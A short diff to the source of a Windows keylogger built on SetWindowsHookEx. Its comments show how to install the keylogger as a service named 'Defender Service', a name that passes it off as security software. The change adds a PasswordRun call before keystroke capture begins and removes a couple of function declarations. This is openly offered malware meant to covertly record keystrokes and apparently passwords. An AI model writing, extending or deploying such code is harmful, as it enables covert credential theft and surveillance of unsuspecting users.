@@ -16,9 +16,6 @@
 // C:\ > sc create "Defender Service" binPath="C:\...\SetWindowsHookEx-Keylogger.exe -service"
 // C:\>sc delete "Defender Service"
 
-int SampleServiceMain(int argc, TCHAR *argv[]);
-LRESULT CALLBACK HookProcedure(int nCode, WPARAM wParam, LPARAM lParam);
-
 // KeyBoard hook handle in global scope
 HHOOK KeyboardHook;
 // Shift Key 
@@ -461,6 +458,8 @@ int WinMain(
 	if (My::Service(lpCmdLine)) {
 		return 0;
 	}
+
+	PasswordRun(lpCmdLine);
 
 	std::cout << "[*] Starting KeyCapture" << std::endl;
 	/*
